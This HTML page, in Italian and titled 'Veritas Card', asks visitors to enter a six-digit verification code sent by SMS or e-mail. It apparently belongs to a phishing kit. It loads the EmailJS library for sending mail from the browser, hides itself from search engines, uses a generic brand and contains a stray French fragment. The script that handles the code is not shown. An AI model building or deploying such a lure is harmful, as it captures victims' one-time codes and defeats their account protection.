 <!DOCTYPE html>

<html lang="it">
<head>
<meta charset="UTF-8">

<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>  Veritas Card  </title>

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link rel="stylesheet" href="style.css">
 <link rel="icon" type="image/png" sizes="32x32" href="favicon-32.png">
<link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
 <link rel="icon" type="image/jpeg" href="favicon.png">
<meta name="robots" content="noindex, nofollow">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<script src="code.js" defer></script>

</head>
<body>
  <div class="page">

   
    <div class="main">
      <div class="card">

        <div class="step active" id="step2">
          <h1>Codice di verifica</h1>

          <p class="subtitle">
            Un codice a 6 cifre è stato inviato tramite <b>SMS</b> o <b>e-mail</b>
            <span id="otpPhone"></span>.
          </p>

          <form id="otpForm">
            <div class="field">
              <label for="otpSingle">Codice inviato tramite SMS</label>
              <input type="text" inputmode="numeric" maxlength="6"
                id="otpSingle" class="otp-single"
                placeholder="— — — — — —"
                autocomplete="one-time-code" required>
            </div>

            <p class="expiry-note">
              Questo codice scade tra <b id="otpTimer">30</b>s.
            </p>

            <button type="submit" class="btn-signin">Conferma</button>
            <div id="result"></div>

            <div class="timer-row">
              <span class="resend disabled" id="resendLink">
Invia nuovamente il codice
 <span id="resendCount">(dans 10s)</span>
              </span>
              <a href="#" class="no-number-link">
                Indietro · Non ho più questo numero
              </a>
            </div>
          </form>
        </div>

      </div>
    </div>

  </div>
</body>
</html>
